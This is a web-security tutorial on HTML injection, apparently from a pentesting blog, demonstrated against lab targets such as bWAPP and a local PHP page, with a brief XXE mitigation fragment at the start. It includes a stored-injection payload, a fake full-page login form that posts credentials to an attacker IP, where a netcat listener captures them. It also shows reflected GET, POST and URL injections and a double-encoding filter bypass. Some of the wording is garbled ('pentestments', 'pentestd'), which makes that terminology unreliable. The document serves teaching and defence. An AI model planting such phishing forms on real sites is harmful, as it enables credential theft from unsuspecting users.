+<li>Another method is using CDATA for ignoring the external entities. CDATA is character data which provides a block which is not parsed by the parser.</li>
+</ul>
+<pre class="lang:default decode:true">&lt;data&gt;&lt;!CDATA [ "'&amp; &gt; characters are ok in here] ]&gt;&lt;/data&gt;<br /><br /></pre>
+<h1 class="post-title entry-title">Comprehensive Guide on HTML Injection</h1>
+<p><strong><em>&ldquo;HTML&rdquo;</em></strong><em>&nbsp;is considered as the&nbsp;<strong>skeleton</strong>&nbsp;for every web-application, as it defines up the structure and the complete posture of the hosted content.</em>&nbsp;So have you ever wondered, if this anatomy got ruined up with some simple scripts? Or this structure itself becomes responsible for the pentestments of the web-applications? , in this guide, we&rsquo;ll learn how such&nbsp;<strong>misconfigured HTML codes</strong>, open the gates for the attackers to manipulate the designed webpages and grabs up the&nbsp;<strong>sensitive data</strong>&nbsp;from the users.</p>
+<h3><strong>Table of Content</strong></h3>
+<ul>
+<li>What is HTML?</li>
+<li>Introduction to HTML Injection</li>
+<li>Impact of HTML Injection</li>
+<li>HTML Injection v/s XSS</li>
+<li>Types of Injection
+<ul>
+<li>Stored HTML</li>
+<li>Reflected HTML
+<ul>
+<li>Reflected GET</li>
+<li>Reflected POST</li>
+<li>Reflected current URL</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Mitigation Steps</li>
+</ul>
+<h3><strong>What is HTML?</strong></h3>
+<p><strong>HTML&nbsp;</strong>is an abbreviation to&nbsp;<strong>&ldquo;H</strong>yper<strong>T</strong>ext&nbsp;<strong>M</strong>arkup&nbsp;<strong>L</strong>angauge<strong>&rdquo;,</strong>&nbsp;is the basic building block of the web, which determine the formation of the web pages over a web-application. HTML is used to design websites that consist the&nbsp;<strong>&ldquo;HyperText&rdquo;</strong>&nbsp;in order to include &ldquo;text inside a text&rdquo; as a hyperlink and a combination of&nbsp;<strong>elements</strong>&nbsp;that wrap up the data items to display in the browser.</p>
+<p><em>So what these elements are?</em></p>
+<p>&ldquo;An element is everything to an HTML page i.e. it contains the&nbsp;<strong>opening&nbsp;</strong>and&nbsp;<strong>closing tag</strong>&nbsp;with the&nbsp;<strong>text content</strong>&nbsp;in between.&rdquo;</p>
+<p><img src="https://1.bp.blogspot.com/-iiXmHEBQXfk/XxcD_7bBzFI/AAAAAAAAmL4/xjhRVyTuqiE-g2nTvtKVWwmT0EFwMHSBwCLcBGAsYHQ/s1600/1.png" alt="" /></p>
+<h3><u>HTML Tag</u></h3>
+<p>An HTML tag label pieces of content, such as &ldquo;heading&rdquo;, &ldquo;paragraph&rdquo;, &ldquo;form&rdquo;, and so on. They are the element names surrounded by&nbsp;<strong>angle brackets</strong>&nbsp;and are of two types &ndash; the &ldquo;start tag&rdquo; also known as&nbsp;<strong>opening tag</strong>&nbsp;and the &ldquo;end tag&rdquo; referred to as&nbsp;<strong>the&nbsp;</strong><strong>closing&nbsp;</strong><strong>one</strong>. Browsers do not display these HTML tags but utilize them to grab up the content of the webpage.</p>
+<h3><u>HTML Attributes</u></h3>
+<p>In order to provide some extra information to the elements, we use&nbsp;<strong><em>attributes,</em></strong>&nbsp;they reside inside the&nbsp;<em>start tag</em>&nbsp;and comes in&nbsp;<strong>&ldquo;name/value&rdquo;</strong>&nbsp;pairs, such that the&nbsp;<strong>attribute name</strong>&nbsp;follows up with an &ldquo;equal-to sign&rdquo; and the&nbsp;<strong>attribute value</strong>&nbsp;is enclosed with the &ldquo;quotation marks&rdquo;.</p>
+<pre class="lang:default decode:true">&lt;a href = "http://hackingguides.in"&gt;Hacking guides &lt;/a&gt;</pre>
+<p>Here the&nbsp;<em>&ldquo;href&rdquo;</em>&nbsp;is the&nbsp;<strong>&ldquo;attribute name&rdquo;</strong>&nbsp;and &ldquo;<em>http://hackingguides&rdquo;</em>&nbsp;is the&nbsp;<strong>&ldquo;attribute value&rdquo;.</strong></p>
+<p>As we&rsquo;re now aware of the basic HTML terminologies, let&rsquo;s check out the&nbsp;<strong>&ldquo;HTML elements flowchart&rdquo;</strong>&nbsp;and then will further try to implement them all to create up a simple web page.</p>
+<p><img src="https://1.bp.blogspot.com/-WJC6pBwcPRw/XxcEDXlEspI/AAAAAAAAmL8/jEg3lSXFbxQPW0nwXX5GN3ZW6Qyq1l8wwCLcBGAsYHQ/s1600/2.png" alt="" /></p>
+<h3><strong><u>Basic HTML Page:</u></strong></h3>
+<p>Every web page over the internet is somewhere or the other an HTML file. These files are nothing but are the simple plain-text files with a&nbsp;<strong>&ldquo;<em>.html</em>&rdquo;&nbsp;</strong>extension, that are saved and executed over a web browser.</p>
+<p>So let&rsquo;s try to create a simple web page in our notepad and save it as&nbsp;<strong>hack.html:</strong></p>
+<pre class="lang:default decode:true">&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt; Hacking guides lab&lt;/title&gt;
+&lt;/head&gt;
+&lt;body bgcolor="pink"&gt;
+&lt;br&gt;
+&lt;center&gt;&lt;h2&gt;WELCOME TO &lt;a href=&rdquo;http://hackingguides.in&rdquo;&gt;HACKING ARTILCES &lt;/a&gt;&lt;/h2&gt;
+&lt;br&gt;
+&lt;p&gt;Author &ldquo;Raj Chandel&rdquo;&lt;/p&gt;
+&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre>
+<p>Let&rsquo;s execute this&nbsp;<strong>&ldquo;hack.html&rdquo;&nbsp;</strong>file in our browser and see what we have developed.</p>
+<p><img src="https://1.bp.blogspot.com/-hrb6TeBXuWQ/XxcEI62MYOI/AAAAAAAAmMA/erY3cIqtAV8_7a6LSxdPkj5zNVScTXnBgCLcBGAsYHQ/s1600/3.png" alt="" /></p>
+<p>Great!! We&rsquo;ve successfully designed our first web-page. But how these tags worked for us, let&rsquo;s check them out:</p>
+<ul>
+<li>The&nbsp;<strong>&lt;html&gt;</strong>element is the root element of every HTML page.</li>
+<li>The&nbsp;<strong>&lt;head&gt;</strong>determines the meta-information about the document.</li>
+<li>The&nbsp;<strong>&lt;title&gt;</strong>element specifies a title for the webpage.</li>
+<li>The&nbsp;<strong>&lt;body&gt;</strong>element contains the visible page content that has the&nbsp;<em>&ldquo;bgcolor&rdquo;</em>&nbsp;as an attribute as&nbsp;<em>&ldquo;pink&rdquo;</em><em>.</em></li>
+<li>The&nbsp;<strong>&lt;br&gt;</strong>element defines break line or it defines up the next line.</li>
+<li>The&nbsp;<strong>&lt;h1&gt;</strong>element defines a large heading.</li>
+<li>The&nbsp;<strong>&lt;p&gt;</strong>element defines a paragraph</li>
+<li>The&nbsp;<strong>&lt;a&gt;&nbsp;</strong>defines up the anchor tag which helps us to set up the&nbsp;<em>&ldquo;hyperlink&rdquo;</em>.</li>
+</ul>
+<p>I guess you are now clear with &ldquo;what HTML is and its major use&rdquo; and &ldquo;how can we implement this all&rdquo;. So let&rsquo;s try to find out the major loopholes and learn how the attackers inject arbitrary HTML codes into vulnerable web pages in order to modify the hosted content.</p>
+<h3><strong>Introduction to HTML Injection</strong></h3>
+<p>HTML Injection also termed as&nbsp;<strong><em>&ldquo;virtual pentestments&rdquo;&nbsp;</em></strong>is one of the most simple and the most common vulnerability that arises when the web-page fails to sanitize the user-supplied input or validates the output, which thus allows the attacker to craft his payloads and injects the malicious HTML codes into the application through the vulnerable fields, such that he can modify the webpage content and even grabs up some sensitive data.</p>
+<p>Let&rsquo;s take a look over this scenario and lean how such HTML Injection attacks are executed:</p>
+<p><em>Consider a web-application which is suffering from HTML Injection vulnerability and it does not validate any specific input. Thus the attacker finds this and he injects his malicious&nbsp;<strong>&ldquo;HTML login Form&rdquo;</strong>&nbsp;with a lure of&nbsp;<strong>&ldquo;Free Movie tickets&rdquo;</strong>&nbsp;to trick the victim into submitting his sensitive credentials.</em></p>
+<p><em>Now as the victims surf that particular webpage, there he found the option to avail those&nbsp;<strong>&ldquo;free movie tickets&rdquo;.</strong>&nbsp;As he clicks over it, he got presented back with the application&rsquo;s login screen, which is nothing but the attacker&rsquo;s crafted&nbsp;<strong>&ldquo;HTML form&rdquo;.&nbsp;</strong>Therefore as soon as he enters his credentials, the attacker&rsquo;s captures them all through his listener machine, leading the victim to compromise his data.</em></p>
+<p><strong><img src="https://1.bp.blogspot.com/-8-J2Ik1zZ3Q/XxcEe2TzwXI/AAAAAAAAmMQ/oxKq0STKmoMUitUFrxDBwXvLu0GbBlYDQCLcBGAsYHQ/s1600/4.png" alt="" /></strong></p>
+<h3><strong>Impact of HTML Injection</strong></h3>
+<p>When the input fields are not properly sanitized over in a webpage, thus sometimes this HTML Injection vulnerability might lead us to&nbsp;<strong>Cross-Site Scripting(XSS)&nbsp;</strong>or&nbsp;<strong>Server-Side Request Forgery(SSRF) attacks.</strong>&nbsp;Therefore this vulnerability has been reported with&nbsp;<strong>Severity Level&nbsp;</strong>as &ldquo;<strong>Medium&rdquo;&nbsp;</strong>and with the&nbsp;<strong>&ldquo;CVSS Score of 5.3&rdquo;&nbsp;</strong>under :</p>
+<ol>
+<li><strong>CWE-80:</strong>&nbsp;Improper Neutralization of Script-Related HTML Tags in a Web Page.</li>
+<li><strong>CWE-79:</strong>&nbsp;Improper Neutralization of Input During Web Page Generation.</li>
+</ol>
+<h3><strong>HTML Injection v/s XSS</strong></h3>
+<p>During such attacks, there are chances when we exempt to perform an&nbsp;<strong>HTML Injection&nbsp;</strong>attack and we fall up with the&nbsp;<strong>XSS&nbsp;</strong>one because HTML injection is almost similar to Cross-site Scripting. But if we look closer between the two, we&rsquo;ll notice that during an<strong>&nbsp;XSS attack</strong>, the attacker have an opportunity to inject and execute the&nbsp;<strong>Javascript codes</strong>&nbsp;whereas in the&nbsp;<strong>HTML</strong>&nbsp;<strong>Injection</strong>&nbsp;he/she is bound to use certain&nbsp;<strong>HTML tags</strong>&nbsp;in order to pentest the webpage.</p>
+<p>Let&rsquo;s now dive in further with the different HTML Injection attacks and check out the unusual ways how we can pentest the webpages and captures up the victim&rsquo;s credentials.</p>
+<h3><strong>Stored HTML</strong></h3>
+<p>A&nbsp;<strong>&ldquo;stored HTML&rdquo;</strong>&nbsp;also termed as&nbsp;<strong>&ldquo;<em>Persistence&rdquo;</em></strong>&nbsp;because through this vulnerability the injected malicious script gets permanently store inside the web-applications server and the application server further drops it out back to the user when he visits the injected webpage. However, when the client clicks on payload which&nbsp;<em>appears as an official part of the website</em>, thus the injected HTML code will get executed by the browser.</p>
+<p>The most common example of&nbsp;<strong>Stored HTML</strong>&nbsp;is the&nbsp;<strong><em>&ldquo;comment option&rdquo;</em></strong>&nbsp;in the blogs, which allow any user to enter his feedback as in the form of comments for the administrator or other users.</p>
+<p>Let&rsquo;s now try to exploit this stored HTML vulnerability and grab up some credentials.</p>
+<h3><strong><u>Exploiting Stored HTML</u></strong></h3>
+<p>I&rsquo;ve opened the target IP in my browser and login inside BWAPP as a&nbsp;<strong>bee: bug</strong>, further I&rsquo;ve set the&nbsp;<strong>&ldquo;Choose Your Bug&rdquo;</strong>&nbsp;option to&nbsp;<strong>&ldquo;</strong><strong><em>HTML Injection &ndash; Stored (Blog)&rdquo;&nbsp;</em></strong>and had fired up the&nbsp;<strong>hack&nbsp;</strong><strong>button</strong><strong>.</strong></p>
+<p>Now, we&rsquo;ll be redirected to the web page which is suffering from an&nbsp;<strong>HTML Injection vulnerability&nbsp;</strong>which allows the user to submit his entry in the blog as shown in the screenshot.</p>
+<p>Initially, we will generate a normal user entry through&nbsp;<strong>&ldquo;bee&rdquo;&nbsp;</strong>as &ldquo;Hacking guides&rdquo;, in order to confirm that the input data has successfully stored up in the webserver&rsquo;s database, which is thus visible in the &ldquo;<strong>Entry field&rdquo;.</strong></p>
+<p><img src="https://1.bp.blogspot.com/-ABizMUGfjcQ/XxcEv67UdzI/AAAAAAAAmMY/XhlyhrEybm0tvCMhSIL3KZOodMGHpK7ZQCLcBGAsYHQ/s1600/5.png" alt="" /></p>
+<p>Now, let&rsquo;s try to inject our malicious payload that will&nbsp;<strong><em>create</em></strong><em>&nbsp;up a fake user&nbsp;<strong>login form&nbsp;</strong></em>over this targeted web page and thus it will forward the captured request over to<strong>&nbsp;our IP</strong>.</p>
+<p>Enter the following HTML code inside the given text area in order to set up the HTML attack. &nbsp;</p>
+<pre class="lang:default decode:true ">&lt;div style="position: absolute; left: 0px; top: 0px; width: 1900px; height: 1300px; z-index:1000; background-color:white; padding:1em;"&gt;Please login with valid 
+credenitals:&lt;br&gt;&lt;form name="login" action="http://192.168.0.7:4444/login.htm"&gt;
+&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="username"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;
+&lt;td&gt;&lt;input type="text" name="password"/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
+&lt;td colspan=2 align=center&gt;&lt;input type="submit" value="Login"/&gt;&lt;/td&gt;&lt;/tr&gt;
+&lt;/table&gt;&lt;/form&gt;</pre>
+<p><img src="https://1.bp.blogspot.com/-mQXMvPvD1XU/XxcE1F7k7LI/AAAAAAAAmMc/TxZyuLlulB8MgXh70Jg62jmxAFWL_RhEQCLcBGAsYHQ/s1600/6.png" alt="" /></p>
+<p>From the below image you can see that, as I clicked over the &ldquo;Submit&rdquo; button, a new login form has been displayed over on the webpage. This login form is thus now into the application&rsquo;s web server, which gets rendered every time whenever the victim visits this malicious login page, he&rsquo;ll always have this form which looks official to him.</p>
+<p><img src="https://1.bp.blogspot.com/-vZ1FIQFkZRU/XxcE-6VExgI/AAAAAAAAmMg/LY7cr9ySPwMFRQwrAuiu_kOeMBz3jgWxwCLcBGAsYHQ/s1600/7.png" alt="" /></p>
+<p>So let&rsquo;s now enable our&nbsp;<strong>netcat listener</strong>&nbsp;at port&nbsp;<strong>4444&nbsp;</strong>&nbsp;in order to capture up the victim&rsquo;s request.</p>
+<pre class="lang:default decode:true">nc &ndash;lvp 4444</pre>
+<p>Though its time to wait, until the victim boots this page up into his browser, and enters his credentials.</p>
+<p><img src="https://1.bp.blogspot.com/-aIwllf9G2bA/XxcFCSrKVzI/AAAAAAAAmMo/hJTzeHhv0tU7atD-_yFvqd0CvAPqR1BkwCLcBGAsYHQ/s1600/8.png" alt="" /></p>
+<p>Great!! From the above image, you can see that the user&nbsp;<strong>&ldquo;Raj&rdquo;</strong>&nbsp;opened the webpage and tried to login inside as&nbsp;<strong>raj:123.</strong></p>
+<p>So let&rsquo;s get back to our&nbsp;<strong>listener&nbsp;</strong>and check whether the credentials are captured in the response or not.</p>
+<p>From the below image, you can see that we&rsquo;ve successfully grabbed up the credentials.</p>
+<p><img src="https://1.bp.blogspot.com/-lTzelOmynck/XxcFF2hjnGI/AAAAAAAAmMw/0ItlfeFpUpkX6ykA_nG4Qpj98lggs50tACLcBGAsYHQ/s1600/9.png" alt="" /></p>
+<h3><strong>Reflected HTML</strong></h3>
+<p>The&nbsp;<strong>reflected HTML</strong>&nbsp;also known as&nbsp;<strong><em>&ldquo;</em></strong><strong><em>Non-Persistence&rdquo;</em></strong>&nbsp;is occurred when the web application responds immediately on user&rsquo;s input without validating what the user entered, this can lead an attacker to inject browser executable code inside the single HTML response. It is termed&nbsp;<strong>&ldquo;non-persistent&rdquo;</strong>&nbsp;as the malicious script does not get stored inside the webserver, thus the attacker needs to send the malicious link through phishing to trap the user.</p>
+<p>Reflected HTML vulnerability can be easily found in&nbsp;<strong>website&rsquo;s search engines</strong>: here the attacker writes up some arbitrary HTML code in the search textbox and, if the website is vulnerable<em>, the result page will return as in response to these HTML entities.</em></p>
+<p>Reflect HTML is basically of three types:</p>
+<ul>
+<li><strong>Reflected HTML GET</strong></li>
+<li><strong>Reflected HTML POST</strong></li>
+<li><strong>Reflected HTML Current URL</strong></li>
+</ul>
+<p>Before making our hands wet by exploiting the Reflected HTML labs, let us recall that &ndash; with the GET method, we&nbsp;<strong>request data&nbsp;</strong>from a specific source whereas the POST method is used to&nbsp;<strong>send data to a server</strong>&nbsp;in order to create/update a resource.</p>
+<h3><strong>Reflected HTML GET</strong></h3>
+<p>Here, we&rsquo;ve created a webpage, which thus permits up the user to submit a &ldquo;feedback&rdquo; with his &ldquo;name&rdquo;.</p>
+<p>So, when the user&nbsp;<strong>&ldquo;Raj Chandel&rdquo;</strong>&nbsp;submits his feedback as&nbsp;<strong>&ldquo;Good&rdquo;</strong>, a message prompts back as&nbsp;<strong><em>&ldquo;Thanks to Raj Chandel for your valuable time.&rdquo;&nbsp;</em></strong>&nbsp;</p>
+<p><img src="https://1.bp.blogspot.com/-TyPpjjNAVUs/XxcFJ4NPbjI/AAAAAAAAmM0/vaNvoWENrXMqykVmfBqFMQcvzjxQ2o7FACLcBGAsYHQ/s1600/10.png" alt="" /></p>
+<p>Thus this instant response and the&nbsp;<em>&ldquo;name/value&rdquo;</em>&nbsp;pairs in the URL shows up that, this page might be vulnerable to&nbsp;<strong>HTML Injection&nbsp;</strong>and the data has been requested over the&nbsp;<strong>GET</strong>&nbsp;method.&nbsp;</p>
+<p>So, let&rsquo;s now try to inject some HTML codes into this &ldquo;form&rdquo; in order to be confirmed up with it. Type following&nbsp; script at the &ldquo;Name&rdquo; field as</p>
+<pre class="lang:default decode:true">&lt;h1&gt;Raj Chandel&lt;/h1&gt;</pre>
+<p>And set Feedback to&nbsp;<strong>&ldquo;Good&rdquo;</strong></p>
+<p>From the below image you can see that the user&rsquo;s name&nbsp;<strong>&ldquo;Raj Chandel&rdquo;</strong>&nbsp;has been modified as the heading as in the response message.</p>
+<p><img src="https://1.bp.blogspot.com/-KKBR_DRWRvA/XxcFOFWfnCI/AAAAAAAAmM4/DWWjjGlhDck13--H0BVQ1GSyvXN4VJjSgCLcBGAsYHQ/s1600/11.png" alt="" /></p>
+<p>Wonder why this all happened, let&rsquo;s check out the following code snippet.</p>
+<p><img src="https://1.bp.blogspot.com/--zzJquDkL9I/XxcFRhpwuWI/AAAAAAAAmNA/4ubVBMhc_wAECTCfdUIg2SEIfigUcVXdQCLcBGAsYHQ/s1600/12.png" alt="" /></p>
+<p>With the ease to reflect the&nbsp;<strong>message</strong>&nbsp;on the screen, the developer didn&rsquo;t set up any input validation i.e. he simply&nbsp;<strong>&ldquo;echo&rdquo;</strong>&nbsp;the&nbsp;<em>&ldquo;Thanks message&rdquo;</em>&nbsp;by including up the input name through the&nbsp;<strong>&ldquo;$_GET&rdquo;</strong>&nbsp;variable.</p>
+<p><em>&ldquo;There are times when the developer sets up some validations into the input fields which thus refects our&nbsp;<strong>HTML code</strong>&nbsp;back onto the screen without getting rendered.&rdquo;</em></p>
+<p>From the below image you can see that when I tried to execute the HTML code in the&nbsp;<strong>name field</strong>, it drops it back as the plain-text as:</p>
+<p><img src="https://1.bp.blogspot.com/-BgS8xgSc7ik/XxcFVK_X_LI/AAAAAAAAmNE/q5VcDlwoR_ofngJbCUGEqcggkgTtAQ4JwCLcBGAsYHQ/s1600/13.png" alt="" /></p>
+<p>So is the vulnerability is patched up here?</p>
+<p>Let&rsquo;s check this all out by capturing its&nbsp;<strong>outgoing Request</strong>&nbsp;with our helping hand &ldquo;burpsuite&rdquo; and will further send the captured request directly to the&nbsp;<strong>&ldquo;Repeater&rdquo;&nbsp;</strong>tab<strong>.</strong></p>
+<p><img src="https://1.bp.blogspot.com/-Ru457472Ues/XxcFYOBt0iI/AAAAAAAAmNM/Kv2h_dKSIech8dvJXik4mU_CXzITkZHXwCLcBGAsYHQ/s1600/14.png" alt="" /></p>
+<p>In the &ldquo;Repeater&rdquo; tab, as I clicked over the&nbsp;<strong>&ldquo;Go&rdquo;&nbsp;</strong>button to check for the generated&nbsp;<strong>response,&nbsp;</strong>I found that my HTML entities have been&nbsp;<strong>HTML decoded</strong>&nbsp;here as:</p>
+<p><img src="https://1.bp.blogspot.com/-m3EmhWG68BQ/XxcFbnkVGmI/AAAAAAAAmNU/E8iyH36F9YoT1iJnR1G39ZJ_b4XCpECcQCLcBGAsYHQ/s1600/15.png" alt="" /></p>
+<p>Thus I coped the complete HTML code&nbsp;<strong><em>&ldquo;&lt;a href = http://hackingguides.in&rdquo;&gt;&lt;h2&gt;Raj&lt;/h2&gt;&lt;/a&gt;&rdquo;</em>&nbsp;</strong>and pasted that all into the&nbsp;<strong>Decoder tab.&nbsp;</strong>Further from the right-hand pallet, I clicked over at&nbsp;<strong>&ldquo;Encode as&rdquo;</strong>&nbsp;and opted for the&nbsp;<strong>URL</strong>&nbsp;one.</p>
+<p>As we get the encoded output, we&rsquo;ll again set it over in the&nbsp;<strong>&ldquo;Encode as&rdquo;</strong>&nbsp;for the&nbsp;<strong>URL</strong>&nbsp;to get it as in the&nbsp;<strong>double URL encoded&nbsp;</strong>format.</p>
+<p><img src="https://1.bp.blogspot.com/-c8cs1b48pAE/XxcFfY1SaSI/AAAAAAAAmNY/3nI2jjAO-tY-YO6HQ2y2IcO679sKyjqngCLcBGAsYHQ/s1600/16.png" alt="" /></p>
+<p>Let&rsquo;s now try this out,&nbsp;<em>copy the complete double encoded URL and paste it over in the&nbsp;<strong>&ldquo;name=&rdquo;</strong>&nbsp;field within the&nbsp;<strong>repeater tab</strong>&nbsp;in the&nbsp;<strong>Request</strong>&nbsp;option.</em></p>
+<p>Click on the&nbsp;<strong>Go&nbsp;</strong>button to check for its generated&nbsp;<strong>Response.</strong></p>
+<p>Great!! From the below image, you can see that we&rsquo;ve successfully manipulated the&nbsp;<strong>Response.</strong></p>
+<p><strong><img src="https://1.bp.blogspot.com/-9AsQr9jqOI8/XxcFjrb3QnI/AAAAAAAAmNc/o7rVjiQbZkYFc1GsXDPUo4_a9MYMapXJwCLcBGAsYHQ/s1600/17.png" alt="" /></strong></p>
+<p>Now just do the similar amendments into the&nbsp;<strong>Proxy&nbsp;</strong>tab and hit the&nbsp;<strong>&ldquo;Forward&rdquo;</strong>&nbsp;button. From the below image you can see that, we &lsquo;ve pentestd this web page too through its validated fields.</p>
+<p><img src="https://1.bp.blogspot.com/-eDLzz6IWbvI/XxcFnAVTaSI/AAAAAAAAmNk/-vJvNOwS7nULF6tYFYj3AJyh1XYYFSq1ACLcBGAsYHQ/s1600/18.png" alt="" /></p>
+<p>Let&rsquo;s check out the code snippet to see where the developer had made input validation:</p>
+<p>From the below image you can see that, here the developer had made a function as&nbsp;<strong>&ldquo;hack&rdquo;&nbsp;</strong>for the variable&nbsp;<strong>data&nbsp;</strong>and even he had decoded the&nbsp;<strong>&ldquo;&lt;&rdquo;&nbsp;</strong>and&nbsp;<strong>&ldquo;&gt;&rdquo;&nbsp;</strong>to&nbsp;<strong>&ldquo;&amp;lt;&rdquo;&nbsp;</strong>and<strong>&nbsp;&ldquo;&amp;gt;&rdquo;&nbsp;</strong>for<strong>&nbsp;$data&nbsp;</strong>and&nbsp;<strong>$input&nbsp;</strong>respectively<strong>,&nbsp;</strong>further he used the inbuilt PHP function&nbsp;<strong>urldecode</strong>&nbsp;over for&nbsp;<strong>$input</strong>&nbsp;to decode up the URL.</p>
+<p><img src="https://1.bp.blogspot.com/-9F4w9XHFdjE/XxcFqP3uITI/AAAAAAAAmNs/DUL4PkWPPLMH0s8hRJZqYZwh3zRUmIDYwCLcBGAsYHQ/s1600/19.png" alt="" /></p>
+<p>From the below image you can see that the developer implemented the function&nbsp;<strong>hack&nbsp;</strong>over at the&nbsp;<strong>name&nbsp;</strong>field.</p>
+<p><img src="https://1.bp.blogspot.com/-Mnu5vEfCBvc/XxcFtSvg0mI/AAAAAAAAmN0/_TRHt9WByGUjohCaowzpNHYYioYFDsYIACLcBGAsYHQ/s1600/20.png" alt="" /></p>
+<h3><strong>Reflected HTML POST</strong></h3>
+<p>Similar to the &ldquo;GET webpage&rdquo;, the&nbsp;<strong>&ldquo;Name&rdquo;&nbsp;</strong>and the&nbsp;<strong>&ldquo;Feedback&rdquo;</strong>&nbsp;fields are vulnerable here too, since the&nbsp;<strong>POST method&nbsp;</strong>has been implemented, thus the form data won&rsquo;t be displayed in the URL.</p>
+<p>Let&rsquo;s try to pentest this webpage again but this time we&rsquo;ll add up an image rather than a static text as</p>
+<pre class="lang:default decode:true">&lt;img src= "https://www.ignitetechnologies.in/img/logo-blue-white.png"&gt;</pre>
+<p>From the below image, you can see that the&nbsp;<strong>&ldquo;Ignite technologies logo&rdquo;</strong>&nbsp;has been placed up over the screen, thus the attacker here can even inject other media formats such as videos, audios or the gifs.</p>
+<p><img src="https://1.bp.blogspot.com/-oybCdw7IKlk/XxcFw1zV2JI/AAAAAAAAmN8/zP9A5FxR_FMlvTWbS0DTwUCrBWQHlt3jACLcBGAsYHQ/s1600/21.png" alt="" /></p>
+<h3><strong>Reflected HTML &nbsp;Current URL</strong></h3>
+<p><em>Can a web-application be vulnerable to HTML Injection with no input fields over on the web page?</em></p>
+<p>Yes, it&rsquo;s not necessary to have an input filed like a&nbsp;<strong>comment box</strong>&nbsp;or&nbsp;<strong>search box</strong>,&nbsp;<em>some applications display your URL over on their webpages</em>&nbsp;and they might be vulnerable to HTML Injection, as in such cases, the&nbsp;<strong>URL&nbsp;</strong>acts as the input field to it.</p>
+<p><img src="https://1.bp.blogspot.com/-cEoGVNWCxUs/XxcF0ax_OWI/AAAAAAAAmOE/q3zmOQX7gsM23U_cUsLdwkMVK9sCA3M2wCLcBGAsYHQ/s1600/22.png" alt="" /></p>
+<p>From the above image, you can see that the&nbsp;<strong>current URL&nbsp;</strong>is being displayed over on the web-page as&nbsp;<strong>&ldquo;<em>http://192.168.0.16/hack/html_URL.php</em>&rdquo;.</strong>&nbsp;So let&rsquo;s take over to this advantage and see what we can grab.</p>
+<p>Tune in your&nbsp;<strong>&ldquo;burpsuite&rdquo;</strong>&nbsp;and capture the ongoing&nbsp;<strong>HTTP Request</strong></p>
+<p><strong><img src="https://1.bp.blogspot.com/-sXKBUKgZU-M/XxcF3xEDLHI/AAAAAAAAmOM/mewkp78E8IgMqluSeO8rQZ_wtBcgLygrQCLcBGAsYHQ/s1600/23.png" alt="" /></strong></p>
+<p>Now let&rsquo;s manipulate this request with :</p>
+<pre class="lang:default decode:true">/hack/html_URL.php/&lt;h1&gt;Hey_are_you_there?&lt;/h1&gt;</pre>
+<p>Click on the&nbsp;<strong>Forward&nbsp;</strong>button to check the result over on the browser.</p>
+<p><img src="https://1.bp.blogspot.com/-U4bcKfxFT_I/XxcF7bjiwuI/AAAAAAAAmOU/QnWEKU82_0gJOAUyjLyOlLLJ-S6F9qKhwCLcBGAsYHQ/s1600/24.png" alt="" /></p>
+<p>Great!! From the below image you can see that we have successfully pentestd the website by simply injecting our desired HTML code into the web application&rsquo;s URL.</p>
+<p><img src="https://1.bp.blogspot.com/-S6rdfIwe4ls/XxcF-1PBJ2I/AAAAAAAAmOc/5K2VUgDyDOs9Ho-QX28lRFGm0aEAg9fwwCLcBGAsYHQ/s1600/25.png" alt="" /></p>
+<p>Let&rsquo;s have a look over its code and see how the developer managed to get the current URL over on the screen</p>
+<p>Here the developer used the PHP global variable as&nbsp;<strong>$_SERVER&nbsp;</strong>in order to capture up the current page URL. Further, he amended the hostname with &ldquo;HTTP_HOST&rdquo; and the requested resource location to the URL with &ldquo;REQUEST_URI&rdquo; and placed it all in the&nbsp;<strong>$url</strong>&nbsp;variable.</p>
+<p><img src="https://1.bp.blogspot.com/-gSE49dGoIsM/XxcGCN-G_YI/AAAAAAAAmOg/MT1blTnYg3kSoP7D2EY7ywk4tLDiALg1ACLcBGAsYHQ/s1600/26.png" alt="" /></p>
+<p>Coming to the HTML section he simply set&nbsp;<strong>echo</strong>&nbsp;with the&nbsp;<strong>$url</strong>&nbsp;variable without any specific validation, in order to display the message with the URL.</p>
+<p><img src="https://1.bp.blogspot.com/-tbcADqhShjM/XxcGFZMyF5I/AAAAAAAAmOk/xIWjf3luPjssmMZ2QUmU4xEG2Totdlw4gCLcBGAsYHQ/s1600/27.png" alt="" /></p>
+<h3><strong>Mitigation Steps</strong></h3>
+<ul>
+<li>The developer should set up his HTML script which filters the metacharacters from user inputs.</li>
+<li>The developer should implement functions to validate the user inputs such that they do not contain any specific tag that can lead to&nbsp;<strong>virtual pentestments.</strong></li>
+</ul>
+</div>
+</div>
+</body>
+</html>
